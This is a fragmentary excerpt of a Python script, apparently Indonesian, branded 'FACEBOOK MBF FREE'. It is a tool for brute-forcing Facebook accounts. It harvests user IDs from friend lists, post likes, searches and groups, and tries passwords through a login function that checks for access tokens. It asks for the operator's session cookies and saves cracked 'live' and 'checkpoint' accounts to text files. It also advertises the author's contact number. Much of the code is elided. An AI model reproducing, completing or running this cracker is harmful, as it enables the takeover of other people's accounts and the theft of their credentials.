...
\t\033[00m FACEBOOK MBF FREE Rayan-XD
\t\033[90m -----------------------\033[94m\n
===========================================\033[00m
Author \033[1;91m: \033[1;96mRayan-XD\033[00m
Facebook \033[1;91m: \033[1;96MRrayan\033[00m
Whatsapp  \033[1;91m: \033[4;92m0858-5276-8706\033[00m
\033[94m===========================================\033[00m""")
def balik():
    f=input("\033[00m\t[\033[96mkembali\033[00m]")
    if f == "":
       os.system("python MBFRAYAN.py")
    else:
...
def mbf():
    ...
    print("\033[00m[\033[93m3\033[00m]  WA AUTHOR")
    ...
    if f == "1":
         ...
         def masuk():
             try:
                    ...
                    cek = input("\033[90m> \033[00m Masukan Coookies : \033[1;92m")
             cek = {"cookie":cek}
         ...
         def login(username,password,cek=False):
             ...
             if 'EAA' in response.text:
                 ...
                 if cek:
                   ...
                   die += 1
             for i in list('\|/-•'):
                            print(f"\r\033[00m[\033[1;91m{i}\033[00m] Live : \033[90m(\033[1;92m{str(result)}\033[90m) \033[00mcheckpoint : \033[90m(\033[1;93m{str(check)}\033[90m) \033[00mdie : \033[90m(\033[1;91m{str(die)}\033[90m)\033[00m",end="")
                            time.sleep(0.2)
         def getid(url):
         ...
         if __name__ == '__main__':
               try:
                   ...
                   clear()
                   baner()
                   kata('\033[1;97m[\033[1;93m1\033[1;97m] \033[00mCrack Idz Daftar Teman')
                   kata('\033[1;97m[\033[1;93m2\033[1;97m] \033[00mCrack Idz Like Post\033[1;97m ')
                   kata('\033[1;97m[\033[1;93m3\033[1;97m] \033[00mCrack Idz Pencarian Nama')
                   kata('\033[1;97m[\033[1;93m4\033[1;97m] \033[00mCrack Idz Grup ')
                   ...
                   if tanya =="":
                         ...
                         try:
                                 ...
                                 file2 = open("results-live.txt").read()
                                 a = file1 + file2
                                 final = a.strip().split("\n")
                                 final = set(final)
                                 ...
                                 print("\033[90m> \033[00msaved to \033[1;93mresults-check.txt\033[90m|\033[1;92mresults-live.txt")
                         except FileNotFoundError:
                   ...
                   if check != 0 or result != 0:
                           ...
                           print("\033[1;94m===========================================\033[00m")
                           print("\n\033[00m[\033[92m✓\033[00m] Done")
                           print("\033[00m[\033[92m✓\033[00m]live : \033[92mresults-life.txt\033[00m")
         ...
         os.system("xdg-open http://wa.me/+6285852768706")
         balik()
